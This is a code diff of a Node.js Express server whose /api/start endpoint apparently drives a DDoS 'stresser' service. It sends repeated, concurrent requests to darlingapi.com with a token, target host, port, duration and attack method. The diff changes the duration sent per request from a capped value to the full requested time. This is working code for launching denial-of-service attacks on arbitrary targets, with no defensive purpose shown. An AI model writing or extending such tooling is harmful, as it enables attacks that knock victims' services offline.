@@ -11,6 +11,7 @@ const PORT = 3000;
 app.use(express.static('public'));
 app.use(express.json());
 
+
 io.on('connection', (socket) => {
     console.log('A user connected');
     
@@ -25,10 +26,11 @@ app.post('/api/start', async (req, res) => {
     const maxTime = 2700;
     const repetitions = Math.ceil(time / maxTime);
 
+    
     try {
         for (let i = 0; i < repetitions; i++) {
             for (let j = 0; j < concurrents; j++) {
-                const url = `https://darlingapi.com?token=${token}&host=${host}&port=${port}&time=${maxTime}&method=${method}`;
+                const url = `https://darlingapi.com?token=${token}&host=${host}&port=${port}&time=${time}&method=${method}`;
                 console.log(`Sending request: ${url}`);
                 await axios.get(url);
             }
